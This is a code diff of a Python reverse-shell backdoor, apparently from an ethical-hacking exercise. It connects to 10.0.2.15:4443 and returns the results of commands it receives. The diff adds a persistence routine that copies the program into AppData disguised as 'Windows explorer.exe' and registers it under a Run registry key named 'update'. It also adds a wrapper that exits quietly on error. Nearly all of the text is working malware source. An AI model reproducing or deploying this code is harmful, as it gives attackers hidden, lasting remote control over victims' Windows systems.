@@ -1,4 +1,4 @@
-#!/usr/bin/python
+#!/usr/bin/env python
 
 import socket
 import subprocess
@@ -6,18 +6,20 @@ import json
 import sys
 import os
 import base64
-
+import shutil
 
 class Backdoor(object):
-    """docstring for Backdoor"""
 
     def __init__(self, ip, port):
-        try:
-            self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            self.connection.connect((ip, port))
-        except Exception as e:
-            print("[-] Could not establish connection due to " + str(e))
-            sys.exit()
+        self.become_persistent()
+        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.connection.connect((ip, port))
+
+    def become_persistent(self):
+        evil_file_location = os.environ["appdata"] + "\\Windows explorer.exe"
+        if not os.path.exists(evil_file_location):
+            shutil.copyfile(sys.executable, evil_file_location)
+            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"', shell=True)
 
     def reliable_send(self, data):
         json_data = json.dumps(data)
@@ -76,5 +78,8 @@ class Backdoor(object):
             self.reliable_send(command_result)
 
 
-my_backdoor = Backdoor("10.0.2.15", 4444)
-my_backdoor.run()
+try:
+    my_backdoor = Backdoor("10.0.2.15", 4443)
+    my_backdoor.run()
+except Exception:
+    sys.exit("[-] Exception caught, exiting program")
